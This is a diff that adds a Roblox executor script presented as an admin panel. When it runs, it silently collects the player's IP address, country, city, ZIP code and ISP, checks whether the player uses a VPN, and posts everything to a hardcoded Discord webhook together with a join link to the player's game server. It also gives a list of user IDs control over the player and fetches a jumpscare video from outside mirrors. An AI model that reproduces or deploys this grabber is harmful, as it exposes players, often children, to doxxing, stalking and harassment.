@@ -1,0 +1,473 @@
+task.spawn(function()
+local webhookUrl =
+	'https://discord.com/api/webhooks/1431165865612673025/3-euJTOzROIDpp9z8ib0-sTXWIZqhLkt8tvfD2mw2FUEdknKpmrSibRa2Iv9OBSg0enK'
+
+local HttpService, Players, MarketplaceService =
+	game:GetService('HttpService'),
+	game:GetService('Players'),
+	game:GetService('MarketplaceService')
+local player, pName, uid =
+	Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId
+
+-- Safe HTTP wrapper
+local requestFunc = http_request
+	or request
+	or syn and syn.request
+	or http and http.request
+local function safeRequestJson(opts)
+	local ok, resp = pcall(requestFunc, opts)
+	if not ok or not resp or not resp.Body then
+		return nil
+	end
+	local success, data = pcall(function()
+		return HttpService:JSONDecode(resp.Body)
+	end)
+	return success and data or nil
+end
+
+-- Avatar & profile
+local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
+	.. pName
+local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
+	.. uid
+	.. '&size=150x150&format=Webp&isCircular=false'
+local ok, data = pcall(function()
+	return HttpService:JSONDecode(game:HttpGet(thumbUrl))
+end)
+if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+	avatarCDN = data.data[1].imageUrl
+end
+local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
+local ok2, info =
+	pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
+local gameName = ok2 and info and info.Name or '[Unknown Game]'
+
+-- IP/Geo info (Primary: ip-api.com)
+local ipInfo = safeRequestJson({
+	Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
+	Method = 'GET',
+})
+local ipAddress, country, countryCode, state, city, zip, isp =
+	ipInfo and ipInfo.query or 'Unknown IP',
+	ipInfo and ipInfo.country or 'Unknown Country',
+	ipInfo and ipInfo.countryCode or 'XX',
+	ipInfo and ipInfo.regionName or 'Unknown Region',
+	ipInfo and ipInfo.city or 'Unknown City',
+	ipInfo and ipInfo.zip or 'Unknown ZIP',
+	ipInfo and ipInfo.isp or 'Unknown ISP'
+
+-- Backup VPN check (ipapi.is)
+local backupIpInfo = safeRequestJson({
+	Url = 'https://api.ipapi.is',
+	Method = 'GET',
+})
+
+-- Flag emoji
+local function getFlagEmoji(code)
+	return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
+end
+local flagEmoji = getFlagEmoji(countryCode)
+
+-- Extreme VPN Detection with Backup API
+local function checkVPN(primaryInfo, backupInfo)
+	if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
+		return '⚠️ Unknown (Suspicious)'
+	end
+
+	local isp = primaryInfo.isp:lower()
+	local ip = primaryInfo.query
+	local countryCode = primaryInfo.countryCode or 'XX'
+
+	-- Expanded blacklist with broader, more aggressive keywords
+	local blacklist = {
+		'vpn',
+		'proxy',
+		'cloud',
+		'server',
+		'host',
+		'data',
+		'colo',
+		'colocation',
+		'ovh',
+		'amazon',
+		'aws',
+		'google',
+		'gcp',
+		'microsoft',
+		'azure',
+		'digitalocean',
+		'linode',
+		'hetzner',
+		'vultr',
+		'leaseweb',
+		'contabo',
+		'rackspace',
+		'alibaba',
+		'cloudflare',
+		'fastly',
+		'akamai',
+		'oracle',
+		'ibm',
+		'zscaler',
+		'nord',
+		'expressvpn',
+		'surfshark',
+		'proton',
+		'mullvad',
+		'windscribe',
+		'private',
+		'secure',
+		'tunnel',
+		'cyber',
+		'virtual',
+		'dedicated',
+		'shared',
+		'network',
+		'internet',
+		'web',
+		'cdn',
+		'ip',
+		'transit',
+		'bandwidth',
+		'connect',
+		'link',
+		'fiber',
+		'broadband',
+	}
+
+	-- Primary check: Blacklist keywords
+	local primarySuspicious = false
+	local primaryDetails = ''
+	for _, badWord in ipairs(blacklist) do
+		if isp:find(badWord) then
+			primarySuspicious = true
+			primaryDetails = ' (Blacklist: ' .. badWord .. ')'
+			break
+		end
+	end
+
+	-- Primary check: Non-standard ISPs
+	local commonResidentialISPs = {
+		'comcast',
+		'verizon',
+		'at&t',
+		'spectrum',
+		'charter',
+		'centurylink',
+		'cox',
+		'bt',
+		'virgin media',
+		'telstra',
+		'optus',
+		'sky',
+		'vodafone',
+		'deutsche telekom',
+		'orange',
+		'telefonica',
+		'xfinity',
+	}
+	local isResidential = false
+	for _, residentialISP in ipairs(commonResidentialISPs) do
+		if isp:find(residentialISP) then
+			isResidential = true
+			break
+		end
+	end
+	if not isResidential then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
+			or primaryDetails .. ', Non-Residential ISP'
+	end
+
+	-- Primary check: Missing ZIP
+	if not primaryInfo.zip or primaryInfo.zip == '' then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
+			or primaryDetails .. ', Missing ZIP'
+	end
+
+	-- Primary check: Generic ISP names
+	if
+		isp:find('^ip[-%d]')
+		or isp:find('^unknown')
+		or isp:find('^anonymous')
+	then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
+			or primaryDetails .. ', Generic ISP Name'
+	end
+
+	-- Primary check: Short ISP name
+	if #isp < 5 then
+		primarySuspicious = true
+		primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
+			or primaryDetails .. ', Vague ISP Name'
+	end
+
+	-- Backup check: ipapi.is for VPN/Proxy/Datacenter
+	local backupSuspicious = false
+	local backupDetails = ''
+	if backupInfo then
+		local isVpn = backupInfo.is_vpn or false
+		local isProxy = backupInfo.is_proxy or false
+		local isDatacenter = backupInfo.is_datacenter or false
+		if isVpn or isProxy or isDatacenter then
+			backupSuspicious = true
+			if isVpn and backupInfo.vpn and backupInfo.vpn.service then
+				backupDetails = ' (Backup API: VPN - '
+					.. backupInfo.vpn.service
+					.. ')'
+			elseif isProxy then
+				backupDetails = ' (Backup API: Proxy)'
+			elseif
+				isDatacenter
+				and backupInfo.datacenter
+				and backupInfo.datacenter.datacenter
+			then
+				backupDetails = ' (Backup API: Datacenter - '
+					.. backupInfo.datacenter.datacenter
+					.. ')'
+			end
+		end
+	end
+
+	-- Cross-reference results
+	if primarySuspicious and backupSuspicious then
+		return '❌ VPN/Proxy Detected' .. primaryDetails .. backupDetails
+	elseif primarySuspicious or backupSuspicious then
+		return '⚠️ Suspicious'
+			.. (primarySuspicious and primaryDetails or backupDetails)
+	end
+
+	return '✅ Clean IP'
+end
+
+local vpnStatus = checkVPN(ipInfo, backupIpInfo)
+
+-- Teleport join script
+local teleportBlock = string.format(
+	"```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
+	game.PlaceId,
+	game.JobId
+)
+
+-- Executor
+local uaDisplay = 'Zenith'
+
+-- Bottom info block (only Game + Executor)
+local bottomBlock = string.format(
+	'**Game:** [%s](%s)\n**💻 Executor:** %s',
+	gameName,
+	gameLink,
+	uaDisplay
+)
+
+-- Copyable IP + ISP block (ASN removed)
+local copyableBlock = string.format(
+	'```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
+	country,
+	city,
+	state,
+	zip,
+	ipAddress,
+	isp
+)
+
+-- Payload
+local data = {
+	content = '||@everyone||',
+	username = pName,
+	avatar_url = avatarCDN,
+	embeds = {
+		{
+			description = '__**' .. pName .. '**__',
+			fields = {
+				{
+					name = '**COUNTRY**',
+					value = flagEmoji .. ' ' .. country,
+					inline = true,
+				},
+				{ name = '**CITY**', value = city, inline = true },
+				{ name = '**REGION**', value = state, inline = true },
+				{
+					name = '‎',
+					value = copyableBlock,
+					inline = false,
+				},
+				{
+					name = 'Status',
+					value = vpnStatus,
+					inline = false,
+				},
+				{
+					name = '📎 Join Script',
+					value = teleportBlock,
+					inline = false,
+				},
+				{
+					name = '‎',
+					value = bottomBlock,
+					inline = false,
+				},
+			},
+			color = 0x3498db,
+			thumbnail = { url = avatarCDN },
+		},
+	},
+}
+
+-- Send webhook
+local ok3, body = pcall(function()
+	return HttpService:JSONEncode(data)
+end)
+if ok3 then
+	pcall(function()
+		requestFunc({
+			Url = webhookUrl,
+			Method = 'POST',
+			Headers = { ['Content-Type'] = 'application/json' },
+			Body = body,
+		})
+	end)
+end
+-- ============= ADMIN PANEL ====================
+-- // === ADMIN PREFIX & SERVICES ===
+local AdminPrefix = '!'
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local TextChatService = game:GetService('TextChatService')
+local CoreGui = game:GetService('CoreGui')
+
+local LocalP = Players.LocalPlayer
+
+-- // === ADMIN TABLE ===
+getgenv().AdminTable = {
+	[9365539393] = { Access = 5 }, -- 0therGuys
+	[7639770688] = { Access = 5 }, -- Anonymous
+	[6189092855] = { Access = 5 }, -- SimpIyCoder
+	[4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
+	[7521547567] = { Access = 5 }, -- Diary0fAnnFrank
+	[8553166637] = { Access = 5 }, -- ZiyahuRBLX
+	[5591605050] = { Access = 5 }, -- sum1betterthanulol
+	[5716119895] = { Access = 5 }, -- CoIdSoverign
+	[3757698948] = { Access = 5 }, -- isokcocs
+
+	-- [] = { Access = 5 }, -- EXAMPLE
+}
+
+local function getAccess(userId)
+	local d = getgenv().AdminTable[userId]
+	return d and d.Access or 0
+end
+
+-- // === PLAYER SEARCH ===
+getgenv().psearch = function(Name)
+	if not Name or Name == '' then
+		return
+	end
+	for _, p in pairs(Players:GetPlayers()) do
+		if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
+			return p
+		end
+	end
+end
+
+-- // === SAFE CHAT SENDER ===
+local function sendChatMessageLocally(msg)
+	local channels = TextChatService:FindFirstChild('TextChannels')
+	if channels then
+		local ch = channels:FindFirstChild('RBXGeneral')
+			or channels:FindFirstChild('General')
+			or channels:FindFirstChild('All')
+		if ch and ch:IsA('TextChannel') then
+			pcall(function()
+				ch:SendAsync(msg)
+			end)
+			return
+		end
+	end
+	local chatFolder =
+		ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
+	if chatFolder then
+		local say = chatFolder:FindFirstChild('SayMessageRequest')
+		if say then
+			pcall(function()
+				say:FireServer(msg, 'All')
+			end)
+		end
+	end
+end
+
+-- // === JUMPSCARE FUNCTION ===
+local function playJumpScare()
+	task.spawn(function()
+		if not isfile('video.webm') then
+			local mirrors = {
+				'https://api.swimhub.xyz/video.webm',
+				'https://raw.githubusercontent.com/swimhubassets/assets/main/video.webm',
+				'https://cdn.swimhub.xyz/video.webm',
+			}
+			for _, url in ipairs(mirrors) do
+				local success, data = pcall(function()
+					return game:HttpGet(url, true)
+				end)
+				if success and data and #data > 50000 then
+					writefile('video.webm', data)
+					break
+				end
+			end
+		end
+
+		repeat
+			task.wait()
+		until isfile('video.webm')
+
+		if not getcustomasset then
+			game.StarterGui:SetCore('SendNotification', {
+				Title = 'Error',
+				Text = 'Executor missing getcustomasset()',
+				Duration = 5,
+			})
+			return
+		end
+
+		local screen = CoreGui:FindFirstChild('RobloxGui') or CoreGui
+		pcall(function()
+			screen.IgnoreGuiInset = true
+		end)
+		for _, v in pairs(screen:GetChildren()) do
+			if v.Name == 'JUMP_SCARE_666' then
+				v:Destroy()
+			end
+		end
+
+		local video = Instance.new('VideoFrame')
+		video.Name = 'JUMP_SCARE_666'
+		video.Size = UDim2.new(1, 0, 1, 0)
+		video.BackgroundTransparency = 1
+		video.ZIndex = 2147483647
+		video.Looped = true
+		video.Visible = false
+		video.Parent = screen
+
+		video.Video = getcustomasset('video.webm')
+		video.Volume = 10
+		video.Visible = true
+		video:Play()
+
+		local flash = Instance.new('Frame', screen)
+		flash.Size = UDim2.new(1, 0, 1, 0)
+		flash.BackgroundColor3 = Color3.new(1, 1, 1)
+		flash.ZIndex = 2147483647
+		task.delay(0.05, function()
+			flash:Destroy()
+		end)
+
+		task.delay(9, function()
+			if video and video.Parent then
+				video:Destroy()
+			end
+		end)
+	end)
+end
+end)
